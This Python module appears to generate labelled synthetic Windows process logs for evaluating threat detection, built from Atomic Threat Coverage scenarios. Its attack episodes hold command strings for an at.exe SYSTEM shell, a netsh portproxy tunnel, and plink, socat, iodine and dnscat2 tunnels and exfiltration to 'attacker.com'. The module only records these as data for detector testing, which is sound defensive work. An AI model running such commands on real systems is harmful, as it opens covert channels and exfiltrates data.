"""
The Atomic Threat Coverage (ATC) scenario events, as Windows 4688 records.

The literal events are the copy in ``eval/scenarios/atc/events.json`` (ATC commit
4270e4e; see the ATTRIBUTION.md beside it). ``atc_sysmon_events`` renders them as the
Sysmon adapter reads them (EventID 4688, process creation): the T1053 lines keep their
own time, host and user; the post-WiFi entries carry only an image and a command line,
so they get the T1053 host (``WS01``) and one second each after the T1053 events.
Decisions 22 and 24 of .scratch/thesis/decisions.md.
"""

import json
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Dict, List

from lumina_cortex.synthetic.generator import (
    BASE_TIME, C2_IP, HOSTS, IPS, USERS,
    _activity_to_activity_id, _activity_to_class_uid, _weighted_choice,
)

# The copied ATC events, in the repository's evaluation tree.
ATC_EVENTS_PATH = Path(__file__).resolve().parents[2] / "eval" / "scenarios" / "atc" / "events.json"

# The host the post-WiFi entries are rendered on (the T1053 events' own host).
ATC_HOST = "WS01"


def _load() -> Dict[str, Any]:
    if not ATC_EVENTS_PATH.is_file():
        raise ValueError(f"ATC events not found at {ATC_EVENTS_PATH} (the repository's evaluation tree)")
    return json.loads(ATC_EVENTS_PATH.read_text(encoding="utf-8"))


def _parse_4688_line(line: str, malicious: bool) -> Dict[str, Any]:
    """``"<time>,ComputerName=..,User=..,Image=..,CommandLine=.."`` as a 4688 record."""
    stamp, *fields = line.split(",")
    values = dict(f.split("=", 1) for f in fields)
    time = datetime.strptime(stamp, "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
    return {
        "EventID": 4688,
        "TimeCreated": time.isoformat(),
        "Computer": values["ComputerName"],
        "User": values["User"],
        "Image": values["Image"],
        "CommandLine": values["CommandLine"],
        "malicious": malicious,
    }


def atc_sysmon_events() -> List[Dict[str, Any]]:
    """Every ATC scenario event, T1053 first, as a Sysmon/Windows 4688 record.

    Each record keeps ATC's own ``malicious`` label (and ``desc`` for the post-WiFi
    entries); the adapter ignores both.
    """
    doc = _load()
    t1053 = [_parse_4688_line(l, True) for l in doc["t1053"]["malicious"]]
    t1053 += [_parse_4688_line(l, False) for l in doc["t1053"]["benign"]]

    last = max(datetime.fromisoformat(e["TimeCreated"]) for e in t1053)
    post_wifi = [
        {
            "EventID": 4688,
            "TimeCreated": (last + timedelta(seconds=i + 1)).isoformat(),
            "Computer": ATC_HOST,
            "Image": entry["Image"],
            "CommandLine": entry["CommandLine"],
            "malicious": entry["malicious"],
            "desc": entry["desc"],
        }
        for i, entry in enumerate(doc["post_wifi"]["simulated_logs"])
    ]
    return t1053 + post_wifi


# ---------------------------------------------------------------------------
# Generator scenarios
# ---------------------------------------------------------------------------
#
# Each scenario is benign background (process, file and logon activity on ws-01..ws-08)
# for its first half; in its second half the background goes on and, at the same rate in
# every scenario, events on WS01 interleave with it: the attack (T1053, or the post-WiFi
# kill chain) or, in ``atc_benign_lookalikes``, ATC's benign look-alike commands. The
# literal ATC events are the Process: Launch events with an ATC command line, converted
# by the Sysmon adapter; every other event is synthetic. Attack events carry the OCSF
# ``attacks`` attribute with their ATT&CK technique; nothing else does.

# Share of the second half's events that are on WS01 (attack or look-alike).
_WS01_SHARE = 0.3

# ATC's benign look-alike command lines.
_LOOKALIKES = (
    "at 14:00 /every:m cmd",
    "cmd.exe /c dir",
    "netsh interface show interface",
    "netsh wlan show profiles",
)

# Synthetic companions of the post-WiFi chain: the registry key `netsh portproxy` writes,
# and the internal host the T1210 phase exploits (the portproxy's connectaddress).
_PORTPROXY_KEY = r"HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp\0.0.0.0/8080"
_EXPLOITED_HOST = "10.0.0.5"


def _launches() -> Dict[str, Dict[str, Any]]:
    """The OCSF Process: Launch of each ATC command line, as the Sysmon adapter gives it."""
    from lumina_cortex.normalizers import to_ocsf

    records = [{k: v for k, v in e.items() if k not in ("malicious", "desc")} for e in atc_sysmon_events()]
    ocsf, _stats = to_ocsf(records, "sysmon")
    return {e["process"]["cmd_line"]: e for e in ocsf}


def _event(activity: str, t: datetime, host: str, **extra: Any) -> Dict[str, Any]:
    event = {
        "class_uid": _activity_to_class_uid(activity),
        "activity_id": _activity_to_activity_id(activity),
        "time": t.isoformat(),
        "device": {"hostname": host},
    }
    event.update(extra)
    return event


def _launch(launches: Dict[str, Dict[str, Any]], cmd_line: str, t: datetime) -> Dict[str, Any]:
    event = json.loads(json.dumps(launches[cmd_line]))
    event["time"] = t.isoformat()
    event["device"] = {"hostname": ATC_HOST}
    return event


def _attack(technique: str, event: Dict[str, Any]) -> Dict[str, Any]:
    event["attacks"] = [{"technique": {"uid": technique}}]
    return event


def _background(rng, t: datetime) -> Dict[str, Any]:
    activity = _weighted_choice(rng, [
        ("Process: Launch", 0.4), ("Process: Terminate", 0.3), ("File: Read", 0.15),
        ("File: Write", 0.1), ("Authentication: Logon", 0.05),
    ])
    return _event(activity, t, rng.choice(HOSTS), actor={"user": {"name": rng.choice(USERS)}})


def _t1053_episode(launches, rng, t: datetime) -> List[Dict[str, Any]]:
    """at.exe schedules an interactive cmd; the job file is written; cmd runs as SYSTEM."""
    return [
        _attack("T1053", _launch(launches, "at 13:20 /interactive cmd", t)),
        _attack("T1053", _event("File: Write", t, ATC_HOST,
                                file={"name": "At1.job", "path": r"C:\Windows\Tasks\At1.job"})),
        _attack("T1053", _event("Process: Launch", t, ATC_HOST,
                                process={"name": r"C:\Windows\System32\cmd.exe", "cmd_line": "cmd"},
                                actor={"user": {"name": "SYSTEM"}})),
    ]


def _post_wifi_phases(launches, rng, t: datetime) -> List[List[Dict[str, Any]]]:
    """One episode per kill-chain phase: T1046, T1210, T1090, T1020, T1048."""
    scanned = rng.choice(IPS)
    port = rng.choice([22, 80, 135, 139, 445, 3389, 8000, 8080])
    scan = [
        _attack("T1046", _event("Network: Connection Open", t, ATC_HOST,
                                dst_endpoint={"ip": scanned, "port": port})),
        _attack("T1046", _event("Network: Connection Close", t, ATC_HOST,
                                dst_endpoint={"ip": scanned, "port": port})),
    ]
    exploit = [
        _attack("T1210", _event("Network: Connection Open", t, ATC_HOST,
                                dst_endpoint={"ip": _EXPLOITED_HOST, "port": 8000})),
        _attack("T1210", _event("Authentication: Logon", t, ATC_HOST,
                                dst_endpoint={"ip": _EXPLOITED_HOST})),
    ]
    tunnel = [
        _attack("T1090", _launch(launches, "netsh interface portproxy add v4tov4 listenport=8080 "
                                           "connectaddress=10.0.0.5 connectport=3389", t)),
        _attack("T1090", _event("Registry: Modify", t, ATC_HOST, registry={"key": _PORTPROXY_KEY})),
    ]
    tool = rng.choice(["plink -R 8080:127.0.0.1:80 attacker.com", "socat TCP-LISTEN:8080 TCP:attacker.com:80"])
    exfil_tools = [
        _attack("T1020", _launch(launches, tool, t)),
        _attack("T1020", _event("Network: Connection Open", t, ATC_HOST, dst_endpoint={"ip": C2_IP, "port": 80})),
        _attack("T1020", _event("Network: Connection Close", t, ATC_HOST, dst_endpoint={"ip": C2_IP, "port": 80})),
    ]
    dns_tool = rng.choice(["iodine -f attacker.com", "dnscat2 --domain attacker.com"])
    dns_exfil = [_attack("T1048", _launch(launches, dns_tool, t))] + [
        _attack("T1048", _event("DNS: Query", t, ATC_HOST, query={"hostname": "attacker.com"}))
        for _ in range(3)
    ]
    return [scan, exploit, tunnel, exfil_tools, dns_exfil]


def _lookalike_episode(launches, rng, t: datetime) -> List[Dict[str, Any]]:
    cmd_line = rng.choice(_LOOKALIKES)
    return [
        _launch(launches, cmd_line, t),
        _event("Process: Terminate", t, ATC_HOST, process={"name": launches[cmd_line]["process"]["name"]}),
    ]


def _build(rng, n_events: int, ws01_events) -> List[Dict[str, Any]]:
    """Background, then background interleaved with the WS01 events ``ws01_events`` yields.

    ``ws01_events(position)`` returns the events of the next WS01 episode, ``position``
    being how far into the second half (0 to 1) the log is.
    """
    events: List[Dict[str, Any]] = []
    t = BASE_TIME
    half = n_events // 2
    pending: List[Dict[str, Any]] = []
    while len(events) < n_events:
        i = len(events)
        if i >= half and (pending or rng.random() < _WS01_SHARE):
            if not pending:
                pending = ws01_events((i - half) / max(n_events - half, 1), t)
            event = pending.pop(0)
            event["time"] = t.isoformat()
            events.append(event)
            t += timedelta(seconds=rng.randint(1, 10))
        else:
            events.append(_background(rng, t))
            t += timedelta(seconds=rng.randint(1, 60))
    return events


def generate_t1053(rng, n_events: int) -> List[Dict[str, Any]]:
    """T1053: the interactive AT job on WS01, with the benign at.exe look-alike in the background."""
    launches = _launches()

    def episode(_position, t):
        if rng.random() < 0.1:
            return [_launch(launches, "at 14:00 /every:m cmd", t)]
        return _t1053_episode(launches, rng, t)

    return _build(rng, n_events, episode)


def generate_post_wifi(rng, n_events: int) -> List[Dict[str, Any]]:
    """The post-WiFi kill chain on WS01, its five phases in order over the second half.

    One in ten WS01 episodes is one of ATC's benign look-alikes instead.
    """
    launches = _launches()

    def episode(position, t):
        if rng.random() < 0.1:
            return _lookalike_episode(launches, rng, t)
        phases = _post_wifi_phases(launches, rng, t)
        return phases[min(int(position * len(phases)), len(phases) - 1)]

    return _build(rng, n_events, episode)


def generate_benign_lookalikes(rng, n_events: int) -> List[Dict[str, Any]]:
    """The control: the same shape, with only ATC's benign look-alikes on WS01."""
    launches = _launches()
    return _build(rng, n_events, lambda _position, t: _lookalike_episode(launches, rng, t))
